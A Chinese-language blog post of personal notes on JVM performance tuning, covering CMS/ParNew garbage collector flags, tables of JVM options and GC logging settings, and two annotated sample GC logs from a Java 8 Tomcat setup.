<p>&#x2606;-XX:+UseParNewGC -XX:+UseConcMarkSweepGC &#x4F7F;&#x7528;ParNew &#x548C; CMS<br>-XX:CMSInitiatingOccupancyFraction=80 &#x5373;&#x8001;&#x5E74;&#x4EE3;&#x6EE1;80%&#x65F6;&#x89E6;&#x53D1;CMS(full gc)&#xFF0C;&#x8C03;&#x9AD8;&#x5219;full gc&#x76F8;&#x5BF9;&#x51CF;&#x5C11;&#xFF0C;&#x8C03;&#x4F4E;&#x5219;full gc&#x5904;&#x7406;&#x5F97;&#x6BD4;&#x8F83;&#x5FEB;&#xFF1B;<br>-XX:+UseCMSCompactAtFullCollection &#x6216; -XX:CMSFullGCsBeforeCompaction=5 &#x5373;full gc&#x524D;&#x6216;&#x540E;&#x505A;&#x788E;&#x7247;&#x6574;&#x7406;&#x3002;</p>
<p>&#x6BCF;&#x6B21;full gc&#x4E4B;&#x540E;&#xFF0C;&#x8FDB;&#x884C;&#x538B;&#x7F29; -XX:CMSFullGCsBeforeCompaction=0</p>
<p>CMS&#x7684;&#x4E24;&#x4E2A;&#x6311;&#x6218;&#xFF1A;</p>
<ol>
<li><p>&#x5806;&#x788E;&#x7247;<br>CMS&#x6536;&#x96C6;&#x5668;&#x9ED8;&#x8BA4;&#x5E76;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x788E;&#x7247;&#x6574;&#x7406;&#x7684;&#x673A;&#x5236;&#x3002;&#x6240;&#x4EE5;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x5F62;&#xFF1A;<br>&#x5373;&#x4F7F;&#x603B;&#x7684;&#x5806;&#x5927;&#x5C0F;&#x8FDC;&#x6CA1;&#x6709;&#x8017;&#x5C3D;&#x4F46;&#x5374;&#x4E0D;&#x80FD;&#x5206;&#x914D;&#x5BF9;&#x8C61;&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x8DB3;&#x591F;&#x8FDE;&#x7EED;&#x7684;&#x7A7A;&#x95F4;&#x5B8C;&#x5168;&#x5BB9;&#x7EB3;&#x5BF9;&#x8C61;&#x3002;<br>&#x5F53;&#x8FD9;&#x79CD;&#x4E8B;&#x53D1;&#x751F;&#x540E;&#xFF0C;JVM&#x4F1A;&#x89E6;&#x53D1;Full GC</p>
</li>
<li><p>&#x5BF9;&#x8C61;&#x5206;&#x914D;&#x7387;&#x9AD8;<br>&#x83B7;&#x53D6;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x7684;&#x9891;&#x7387;&#x9AD8;&#x4E8E;&#x6536;&#x96C6;&#x5668;&#x6E05;&#x9664;&#x5806;&#x91CC;&#x6B7B;&#x5BF9;&#x8C61;&#x7684;&#x9891;&#x7387;<br>&#x5E76;&#x53D1;&#x6A21;&#x5F0F;&#x5931;&#x8D25;&#xFF1A; &#x8001;&#x5E74;&#x4EE3;&#x6CA1;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x53EF;&#x7528;&#x7A7A;&#x95F4;&#x6765;&#x5BB9;&#x7EB3;&#x4E00;&#x4E2A;&#x4ECE;&#x5E74;&#x8F7B;&#x4EE3;&#x63D0;&#x5347;&#x8FC7;&#x6765;&#x7684;&#x5BF9;&#x8C61;<br>&#x6B64;&#x65F6;JVM&#x4F1A;&#x6267;&#x884C;&#x5806;&#x788E;&#x7247;&#x6574;&#x7406;&#xFF1A;&#x89E6;&#x53D1;Full GC</p>
</li>
</ol>
<p>&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#x6CA1;&#x6709;&#x5177;&#x4F53;&#x5C1D;&#x8BD5;&#xFF0C;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x53C2;&#x6570;&#x540D;&#x79F0;</th>
<th style="text-align:center">&#x542B;&#x4E49;</th>
<th style="text-align:center">&#x9ED8;&#x8BA4;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-Xss</td>
<td style="text-align:center">&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5806;&#x6808;&#x5927;&#x5C0F;</td>
<td style="text-align:center">JDK5.0&#x4EE5;&#x540E;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x5806;&#x6808;&#x5927;&#x5C0F;&#x4E3A;1M,&#x4EE5;&#x524D;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x5806;&#x6808;&#x5927;&#x5C0F;&#x4E3A;256K.&#x66F4;&#x5177;&#x5E94;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6240;&#x9700;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C; &#x8C03;&#x6574;.&#x5728;&#x76F8;&#x540C;&#x7269;&#x7406;&#x5185;&#x5B58;&#x4E0B;,&#x51CF;&#x5C0F;&#x8FD9;&#x4E2A;&#x503C;&#x80FD;&#x751F;&#x6210;&#x66F4;&#x591A;&#x7684;&#x7EBF;&#x7A0B;.&#x4F46;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5BF9;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5185;&#x7684;&#x7EBF;&#x7A0B;&#x6570;&#x8FD8;&#x662F;&#x6709;&#x9650;&#x5236;&#x7684;,&#x4E0D;&#x80FD;&#x65E0;&#x9650;&#x751F;&#x6210;,&#x7ECF;&#x9A8C;&#x503C;&#x5728;3000~5000&#x5DE6;&#x53F3;&#x4E00;&#x822C;&#x5C0F;&#x7684;&#x5E94;&#x7528;&#xFF0C; &#x5982;&#x679C;&#x6808;&#x4E0D;&#x662F;&#x5F88;&#x6DF1;&#xFF0C; &#x5E94;&#x8BE5;&#x662F;128k&#x591F;&#x7528;&#x7684; &#x5927;&#x7684;&#x5E94;&#x7528;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;256k&#x3002;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x5BF9;&#x6027;&#x80FD;&#x5F71;&#x54CD;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x4E25;&#x683C;&#x7684;&#x6D4B;&#x8BD5;&#x3002;&#xFF08;&#x6821;&#x957F;&#xFF09;&#x548C;threadstacksize&#x9009;&#x9879;&#x89E3;&#x91CA;&#x5F88;&#x7C7B;&#x4F3C;,&#x5B98;&#x65B9;&#x6587;&#x6863;&#x4F3C;&#x4E4E;&#x6CA1;&#x6709;&#x89E3;&#x91CA;,&#x5728;&#x8BBA;&#x575B;&#x4E2D;&#x6709;&#x8FD9;&#x6837;&#x4E00;&#x53E5;&#x8BDD;:-Xss is translated in a VM flag named ThreadStackSize&#x4E00;&#x822C;&#x8BBE;&#x7F6E;&#x8FD9;&#x4E2A;&#x503C;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</td>
</tr>
<tr>
<td style="text-align:center">-XX:ThreadStackSize</td>
<td style="text-align:center">Thread Stack Size</td>
<td style="text-align:center">(0 means use default stack size) [Sparc: 512; Solaris x86: 320 (was 256 prior in 5.0 and earlier); Sparc 64 bit: 1024; Linux amd64: 1024 (was 0 in 5.0 and earlier); all others 0.]</td>
</tr>
<tr>
<td style="text-align:center">-XX:LargePageSizeInBytes</td>
<td style="text-align:center">&#x5185;&#x5B58;&#x9875;&#x7684;&#x5927;&#x5C0F;&#x4E0D;&#x53EF;&#x8BBE;&#x7F6E;&#x8FC7;&#x5927;&#xFF0C; &#x4F1A;&#x5F71;&#x54CD;Perm&#x7684;&#x5927;&#x5C0F;</td>
<td style="text-align:center">=128m</td>
</tr>
<tr>
<td style="text-align:center">-XX:+UseFastAccessorMethods</td>
<td style="text-align:center">&#x539F;&#x59CB;&#x7C7B;&#x578B;&#x7684;&#x5FEB;&#x901F;&#x4F18;&#x5316;</td>
</tr>
<tr>
<td style="text-align:center">-XX:+DisableExplicitGC</td>
<td style="text-align:center">&#x5173;&#x95ED;System.gc()</td>
<td style="text-align:center">&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x9700;&#x8981;&#x4E25;&#x683C;&#x7684;&#x6D4B;&#x8BD5;</td>
</tr>
<tr>
<td style="text-align:center">-XX:MaxTenuringThreshold</td>
<td style="text-align:center">&#x5783;&#x573E;&#x6700;&#x5927;&#x5E74;&#x9F84;</td>
<td style="text-align:center">&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;0&#x7684;&#x8BDD;,&#x5219;&#x5E74;&#x8F7B;&#x4EE3;&#x5BF9;&#x8C61;&#x4E0D;&#x7ECF;&#x8FC7;Survivor&#x533A;,&#x76F4;&#x63A5;&#x8FDB;&#x5165;&#x5E74;&#x8001;&#x4EE3;. &#x5BF9;&#x4E8E;&#x5E74;&#x8001;&#x4EE3;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x5E94;&#x7528;,&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x6548;&#x7387;.&#x5982;&#x679C;&#x5C06;&#x6B64;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x8F83;&#x5927;&#x503C;,&#x5219;&#x5E74;&#x8F7B;&#x4EE3;&#x5BF9;&#x8C61;&#x4F1A;&#x5728;Survivor&#x533A;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x590D;&#x5236;,&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x589E;&#x52A0;&#x5BF9;&#x8C61;&#x518D;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5B58;&#x6D3B; &#x65F6;&#x95F4;,&#x589E;&#x52A0;&#x5728;&#x5E74;&#x8F7B;&#x4EE3;&#x5373;&#x88AB;&#x56DE;&#x6536;&#x7684;&#x6982;&#x7387; &#x8BE5;&#x53C2;&#x6570;&#x53EA;&#x6709;&#x5728;&#x4E32;&#x884C;GC&#x65F6;&#x624D;&#x6709;&#x6548;.</td>
</tr>
<tr>
<td style="text-align:center">-XX:+AggressiveOpts</td>
<td style="text-align:center">&#x52A0;&#x5FEB;&#x7F16;&#x8BD1;          </td>
</tr>
<tr>
<td style="text-align:center">-XX:+UseBiasedLocking</td>
<td style="text-align:center">&#x9501;&#x673A;&#x5236;&#x7684;&#x6027;&#x80FD;&#x6539;&#x5584;          </td>
</tr>
<tr>
<td style="text-align:center">-Xnoclassgc</td>
<td style="text-align:center">&#x7981;&#x7528;&#x5783;&#x573E;&#x56DE;&#x6536;          </td>
</tr>
<tr>
<td style="text-align:center">-XX:SoftRefLRUPolicyMSPerMB</td>
<td style="text-align:center">&#x6BCF;&#x5146;&#x5806;&#x7A7A;&#x95F2;&#x7A7A;&#x95F4;&#x4E2D;SoftReference&#x7684;&#x5B58;&#x6D3B;&#x65F6;&#x95F4;</td>
<td style="text-align:center">1s    softly reachable objects will remain alive for some amount of time after the last time they were referenced. The default value is one second of lifetime per free megabyte in the heap</td>
</tr>
<tr>
<td style="text-align:center">-XX:PretenureSizeThreshold</td>
<td style="text-align:center">&#x5BF9;&#x8C61;&#x8D85;&#x8FC7;&#x591A;&#x5927;&#x662F;&#x76F4;&#x63A5;&#x5728;&#x65E7;&#x751F;&#x4EE3;&#x5206;&#x914D;</td>
<td style="text-align:center">0    &#x5355;&#x4F4D;&#x5B57;&#x8282; &#x65B0;&#x751F;&#x4EE3;&#x91C7;&#x7528;Parallel Scavenge GC&#x65F6;&#x65E0;&#x6548; &#x53E6;&#x4E00;&#x79CD;&#x76F4;&#x63A5;&#x5728;&#x65E7;&#x751F;&#x4EE3;&#x5206;&#x914D;&#x7684;&#x60C5;&#x51B5;&#x662F;&#x5927;&#x7684;&#x6570;&#x7EC4;&#x5BF9;&#x8C61;,&#x4E14;&#x6570;&#x7EC4;&#x4E2D;&#x65E0;&#x5916;&#x90E8;&#x5F15;&#x7528;&#x5BF9;&#x8C61;.</td>
</tr>
<tr>
<td style="text-align:center">-XX:TLABWasteTargetPercent</td>
<td style="text-align:center">TLAB&#x5360;eden&#x533A;&#x7684;&#x767E;&#x5206;&#x6BD4;</td>
<td style="text-align:center">1%</td>
</tr>
<tr>
<td style="text-align:center">-XX:+CollectGen0First</td>
<td style="text-align:center">FullGC&#x65F6;&#x662F;&#x5426;&#x5148;YGC</td>
<td style="text-align:center">false</td>
</tr>
</tbody>
</table>
<p>&#x5176;&#x4ED6;&#x529F;&#x80FD;&#xFF0C;&#x65B9;&#x4FBF;&#x4E4B;&#x540E;&#x67E5;&#x627E;&#x95EE;&#x9898;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x53C2;&#x6570;&#x540D;&#x79F0;</th>
<th style="text-align:center">&#x542B;&#x4E49;</th>
<th style="text-align:center">&#x9ED8;&#x8BA4;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-XX:+HeapDumpOnOutOfMemoryError</td>
<td style="text-align:center">&#x5728;OutOfMenory&#x7684;&#x65F6;&#x5019;&#x81EA;&#x52A8;&#x521B;&#x5EFA;Heapdump,&#x6CE8;&#xFF1A;&#x5176;&#x4E2D;&#x4E0D;&#x8BBE;-XX:HeapDumpPath&#x65F6;&#xFF0C;dump&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x5728;/tomcat_home/bin&#x76EE;&#x5F55;&#x4E0B;</td>
<td style="text-align:center">-XX:HeapDumpPath=D:/heapdump,&#x6587;&#x7AE0;&#x6700;&#x540E;&#x8FD8;&#x6709;&#x624B;&#x52A8;&#x751F;&#x6210;jmap</td>
</tr>
</tbody>
</table>
<p>&#x4E3A;&#x4E86;&#x5206;&#x6790;&#x53EF;&#x4EE5;&#x5C06;gc&#x65E5;&#x5FD7;&#x641E;&#x51FA;&#x6765;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x5C5E;&#x6027;</th>
<th style="text-align:center">&#x8BF4;&#x660E;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-XX:+PrintGC</td>
<td style="text-align:center">&#x8F93;&#x51FA;&#x5F62;&#x5F0F; :  [GC 118250K-&gt;113543K(130112K), 0.0094143 secs]  [Full GC 121376K-&gt;10414K(130112K), 0.0650971 secs]</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintGCDetails</td>
<td style="text-align:center">&#x8F93;&#x51FA;&#x5F62;&#x5F0F;:[GC [DefNew: 8614K-&gt;781K(9088K), 0.0123035 secs] 118250K-&gt;113543K(130112K), 0.0124633 secs] [GC [DefNew: 8614K-&gt;8614K(9088K), 0.0000665 secs][Tenured: 112761K-&gt;10414K(121024K), 0.0433488 secs] 121376K-&gt;10414K(130112K), 0.0436268 secs]</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintGCTimeStamps</td>
<td style="text-align:center">-XX:+PrintGCDateStamps</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintGC:PrintGCTimeStamps</td>
<td style="text-align:center">&#x53EF;&#x4E0E;-XX:+PrintGC -XX:+PrintGCDetails&#x6DF7;&#x5408;&#x4F7F;&#x7528;  &#x8F93;&#x51FA;&#x5F62;&#x5F0F;:11.851: [GC 98328K-&gt;93620K(130112K), 0.0082960 secs]</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintGCApplicationStoppedTime</td>
<td style="text-align:center">&#x6253;&#x5370;&#x5783;&#x573E;&#x56DE;&#x6536;&#x671F;&#x95F4;&#x7A0B;&#x5E8F;&#x6682;&#x505C;&#x7684;&#x65F6;&#x95F4;.&#x53EF;&#x4E0E;&#x4E0A;&#x9762;&#x6DF7;&#x5408;&#x4F7F;&#x7528;    &#x8F93;&#x51FA;&#x5F62;&#x5F0F;:Total time for which application threads were stopped: 0.0468229 seconds</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintGCApplicationConcurrentTime</td>
<td style="text-align:center">&#x6253;&#x5370;&#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x524D;,&#x7A0B;&#x5E8F;&#x672A;&#x4E2D;&#x65AD;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4;.&#x53EF;&#x4E0E;&#x4E0A;&#x9762;&#x6DF7;&#x5408;&#x4F7F;&#x7528;         &#x8F93;&#x51FA;&#x5F62;&#x5F0F;:Application time: 0.5291524 seconds</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintHeapAtGC</td>
<td style="text-align:center">&#x6253;&#x5370;GC&#x524D;&#x540E;&#x7684;&#x8BE6;&#x7EC6;&#x5806;&#x6808;&#x4FE1;&#x606F;</td>
</tr>
<tr>
<td style="text-align:center">-Xloggc:../logs/gc.log</td>
<td style="text-align:center">&#x628A;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5230;&#x6587;&#x4EF6;&#x4EE5;&#x4FBF;&#x5206;&#x6790;.</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintClassHistogram</td>
<td style="text-align:center">garbage collects before printing the histogram.    &#x4E0E;&#x4E0A;&#x9762;&#x51E0;&#x4E2A;&#x914D;&#x5408;&#x4F7F;&#x7528;</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintTLAB</td>
<td style="text-align:center">&#x67E5;&#x770B;TLAB&#x7A7A;&#x95F4;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintTenuringDistribution</td>
<td style="text-align:center">&#x67E5;&#x770B;&#x6BCF;&#x6B21;minor GC&#x540E;&#x65B0;&#x7684;&#x5B58;&#x6D3B;&#x5468;&#x671F;&#x7684;&#x9608;&#x503C;         Desired survivor size 1048576 bytes, new threshold 7 (max 15) new threshold 7&#x5373;&#x6807;&#x8BC6;&#x65B0;&#x7684;&#x5B58;&#x6D3B;&#x5468;&#x671F;&#x7684;&#x9608;&#x503C;&#x4E3A;7&#x3002;</td>
</tr>
<tr>
<td style="text-align:center">-XX:+PrintTenuringDistribution</td>
<td style="text-align:center">&#x6253;&#x5370;&#x5BF9;&#x8C61;&#x5E74;&#x9F84; &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x7684;15&#xFF0C;jvm&#x662F;&#x52A8;&#x6001;&#x5BF9;&#x8C61;&#x5E74;&#x9F84;&#x5224;&#x5B9A;&#x7684; &#x53D6;&#x51B3;&#x4E8E;survivor&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x8C03;&#x5927;survivor&#x4F1A;&#x589E;&#x52A0;age</td>
</tr>
<tr>
<td style="text-align:center">-XX:MaxTenuringThreshold=10</td>
<td style="text-align:center">Desired survivor size 40239104 bytes, new threshold 6 (max 6)&#x610F;&#x601D;&#x662F;&#x8BF4;&#x5BF9;&#x8C61;&#x5728;survivor&#x533A;&#x57DF;&#x4E2D;&#x7ECF;&#x8FC7;10minorGC&#x8FD8;&#x5B58;&#x6D3B;&#x7684;&#x8BDD;&#x5C31;&#x63D0;&#x62D4;&#x5230;&#x8001;&#x751F;&#x4EE3;&#x3002;&#x518D;&#x6BD4;&#x5982; -XX:SurvivorRatio=65536 -XX:MaxTenuringThreshold=0&#x8FD9;&#x6837;&#x7684;&#x914D;&#x7F6E;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x53BB;&#x6389;&#x4E86;survivor&#x533A;&#x57DF;&#xFF0C;&#x76F4;&#x63A5;&#x5C06;&#x5BF9;&#x8C61;&#x4ECE;eden&#x533A;&#x57DF;&#x63D0;&#x62D4;&#x5230;&#x8001;&#x751F;&#x4EE3;</td>
</tr>
</tbody>
</table>
<h4 id="tomcat&#x4E0B;&#x7684;&#x51E0;&#x4E2A;&#x65E5;&#x5FD7;"><a href="#tomcat&#x4E0B;&#x7684;&#x51E0;&#x4E2A;&#x65E5;&#x5FD7;" class="headerlink" title="tomcat&#x4E0B;&#x7684;&#x51E0;&#x4E2A;&#x65E5;&#x5FD7;"></a>tomcat&#x4E0B;&#x7684;&#x51E0;&#x4E2A;&#x65E5;&#x5FD7;</h4><p>gc&#x65E5;&#x5FD7; &#x914D;&#x7F6E;Catalina.bat JAVA_OPTS<br>-XX:+PrintGCDetails -Xloggc:..\logs\gc.log -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -XX:+PrintHeapAtGC</p>
<h5 id="&#x6839;&#x636E;gc-log&#x5206;&#x6790;&#x6536;&#x96C6;&#x5668;"><a href="#&#x6839;&#x636E;gc-log&#x5206;&#x6790;&#x6536;&#x96C6;&#x5668;" class="headerlink" title="&#x6839;&#x636E;gc log&#x5206;&#x6790;&#x6536;&#x96C6;&#x5668;"></a>&#x6839;&#x636E;gc log&#x5206;&#x6790;&#x6536;&#x96C6;&#x5668;</h5><p><a href="http://blog.csdn.net/doc_sgl/article/details/46594123" target="_blank" rel="external">&#x65E5;&#x5FD7;&#x542B;&#x4E49;&#x53CA;&#x5206;&#x6790;</a><br>&#x9ED8;&#x8BA4;&#x7684;&#x5783;&#x573E;&#x6536;&#x96C6;&#x5668; PS Scavenge &#x548C;PS MarkSweep  &#x5BF9;&#x5E94; PS Eden &#x548C;PS Old<br><code>-XX:+UseParallelGC</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Java HotSpot(TM) 64-Bit Server VM (25.111-b14) for windows-amd64 JRE (1.8.0_111-b14), built on Sep 22 2016 19:24:05 by &quot;java_re&quot; with MS VC++ 10.0 (VS2010)</div><div class="line">Memory: 4k page, physical 8299408k(1668496k free), swap 16596956k(4817128k free)</div><div class="line">CommandLine flags: -XX:InitialHeapSize=1073741824 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=536870912 -XX:NewSize=536870912 -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:-UseLargePagesIndividualAllocation -XX:+UseParallelGC </div><div class="line">3.009: [GC (Allocation Failure) [PSYoungGen: 393216K-&gt;44906K(458752K)] 393216K-&gt;44994K(983040K), 0.0299992 secs] [Times: user=0.09 sys=0.02, real=0.03 secs] </div><div class="line">4.184: [GC (Metadata GC Threshold) [PSYoungGen: 438122K-&gt;52440K(458752K)] 438210K-&gt;52536K(983040K), 0.0307814 secs] [Times: user=0.09 sys=0.00, real=0.03 secs] </div><div class="line">4.215: [Full GC (Metadata GC Threshold) [PSYoungGen: 52440K-&gt;0K(458752K)] [ParOldGen: 96K-&gt;50332K(524288K)] 52536K-&gt;50332K(983040K), [Metaspace: 20805K-&gt;20805K(1069056K)], 0.0588943 secs] [Times: user=0.19 sys=0.03, real=0.06 secs] </div><div class="line">5.833: [GC (Metadata GC Threshold) [PSYoungGen: 223304K-&gt;16405K(458752K)] 273636K-&gt;66746K(983040K), 0.0090804 secs] [Times: user=0.00 sys=0.03, real=0.01 secs] </div><div class="line">5.842: [Full GC (Metadata GC Threshold) [PSYoungGen: 16405K-&gt;0K(458752K)] [ParOldGen: 50340K-&gt;35102K(524288K)] 66746K-&gt;35102K(983040K), [Metaspace: 34776K-&gt;34776K(1081344K)], 0.0372804 secs] [Times: user=0.09 sys=0.00, real=0.04 secs]</div></pre></td></tr></table></figure></p>
<p>&#x8BF4;&#x660E; &#x8FDB;&#x884C;&#x4E86;&#x4E09;&#x6B21; Minor GC(Metadata GC Threshold)&#x548C;&#x4E8C;&#x6B21;Full GC (Metadata GC Threshold)&#xFF0C;PSYoungGen &#x548C;ParOldGen Metaspace&#x4E09;&#x4E2A;&#x533A;&#x57DF;&#x8FDB;&#x884C;garbage&#x56DE;&#x6536;&#xFF0C;</p>
<p>-XX:+UseParNewGC  -XX:+UseConcMarkSweepGC&#x5BF9;&#x5E94;  ParNew Eden &#x548C; CMS Old</p>
<p>&#x5404;&#x79CD;&#x6536;&#x96C6;&#x5668;&#x7684;&#x642D;&#x914D;<br><img src="/2017/08/29/&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x6027;&#x80FD;&#x8C03;&#x4F18;/gc&#x6536;&#x96C6;&#x5668;.jpg" alt="jvm"></p>
<p>&#x53C2;&#x6570;&#xFF1A;<code>-XX:+UseConcMarkSweepGC -XX:+UseParNewGC</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Java HotSpot(TM) 64-Bit Server VM (25.111-b14) for windows-amd64 JRE (1.8.0_111-b14), built on Sep 22 2016 19:24:05 by &quot;java_re&quot; with MS VC++ 10.0 (VS2010)</div><div class="line">Memory: 4k page, physical 8299408k(1605020k free), swap 16596956k(4755960k free)</div><div class="line">CommandLine flags: -XX:InitialHeapSize=1073741824 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=536870912 -XX:MaxTenuringThreshold=6 -XX:NewSize=536870912 -XX:OldPLABSize=16 -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseConcMarkSweepGC -XX:-UseLargePagesIndividualAllocation -XX:+UseParNewGC </div><div class="line">2.538: [GC (Allocation Failure) 2.538: [ParNew: 419456K-&gt;45084K(471872K), 0.0319020 secs] 419456K-&gt;45084K(996160K), 0.0320000 secs] [Times: user=0.09 sys=0.00, real=0.03 secs] </div><div class="line">4.063: [GC (Allocation Failure) 4.063: [ParNew: 464540K-&gt;47903K(471872K), 0.0510502 secs] 464540K-&gt;62045K(996160K), 0.0511090 secs] [Times: user=0.19 sys=0.00, real=0.05 secs] </div><div class="line">4.114: [GC (CMS Initial Mark) [1 CMS-initial-mark: 14142K(524288K)] 69798K(996160K), 0.0044547 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] </div><div class="line">4.119: [CMS-concurrent-mark-start]</div><div class="line">4.131: [CMS-concurrent-mark: 0.013/0.013 secs] [Times: user=0.06 sys=0.00, real=0.01 secs] </div><div class="line">4.131: [CMS-concurrent-preclean-start]</div><div class="line">4.132: [CMS-concurrent-preclean: 0.001/0.001 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] </div><div class="line">4.132: [CMS-concurrent-abortable-preclean-start]</div><div class="line">5.631: [CMS-concurrent-abortable-preclean: 1.022/1.499 secs] [Times: user=3.53 sys=0.31, real=1.50 secs] </div><div class="line">5.631: [GC (CMS Final Remark) [YG occupancy: 264766 K (471872 K)]5.631: [Rescan (parallel) , 0.0148491 secs]5.646: [weak refs processing, 0.0000339 secs]5.646: [class unloading, 0.0040028 secs]5.650: [scrub symbol table, 0.0052723 secs]5.656: [scrub string table, 0.0006273 secs][1 CMS-remark: 14142K(524288K)] 278909K(996160K), 0.0254939 secs] [Times: user=0.08 sys=0.00, real=0.03 secs] </div><div class="line">5.657: [CMS-concurrent-sweep-start]</div><div class="line">5.660: [CMS-concurrent-sweep: 0.003/0.003 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] </div><div class="line">5.660: [CMS-concurrent-reset-start]</div><div class="line">5.660: [CMS-concurrent-reset: 0.001/0.001 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] </div><div class="line">310.132: [GC (Allocation Failure) 310.132: [ParNew: 467359K-&gt;25032K(471872K), 0.0437937 secs] 481496K-&gt;47728K(996160K), 0.0438755 secs] [Times: user=0.03 sys=0.05, real=0.04 secs] </div><div class="line">2176.769: [GC (Allocation Failure) 2176.769: [ParNew: 444488K-&gt;20094K(471872K), 0.0397949 secs] 467184K-&gt;42790K(996160K), 0.0399206 secs] [Times: user=0.13 sys=0.00, real=0.04 secs] </div><div class="line">4106.112: [GC (Allocation Failure) 4106.112: [ParNew: 439550K-&gt;27010K(471872K), 0.0349045 secs] 462246K-&gt;49707K(996160K), 0.0350339 secs] [Times: user=0.05 sys=0.03, real=0.03 secs]</div></pre></td></tr></table></figure>
<p>5&#x6B21;GC (Allocation Failure)&#x548C;2&#x6B21;Full GC &#xFF0C;&#x8FD9;&#x4E2A;&#x6211;&#x8FD8;&#x6CA1;&#x6709;&#x770B;&#x51FA;&#x6765;&#x600E;&#x4E48;&#x662F;&#x4E24;&#x6B21;&#xFF0C;CMS Initial Mark &#x4E00;&#x6B21;&#xFF0C; CMS Final Remark&#x4E00;&#x6B21;&#xFF1F;&#x597D;&#x50CF;jconsole&#x548C;jvisualvm&#x7684;&#x7EDF;&#x8BA1;&#x4E0D;&#x4E00;&#x81F4;&#x3002;<br>5.631: [GC (CMS Final Remark) [YG occupancy: 264766 K (471872 K)]5.631: [Rescan (parallel) , 0.0148491 secs]5.646: [weak refs processing, 0.0000339 secs]5.646: [class unloading, 0.0040028 secs]5.650: [scrub symbol table, 0.0052723 secs]5.656: [scrub string table, 0.0006273 secs][1 CMS-remark: 14142K(524288K)] 278909K(996160K), 0.0254939 secs] [Times: user=0.08 sys=0.00, real=0.03 secs]<br>&#x8FD9;&#x4E2A;&#x662F;&#x5168;&#x90E8;GC&#x7684;&#xFF0C; YG occupancy&#x3001;Rescan (parallel)&#x3001;weak refs processing&#x3001;class unloadingscrub symbol table&#x3001;scrub string table&#x3001;1 CMS-remark</p>
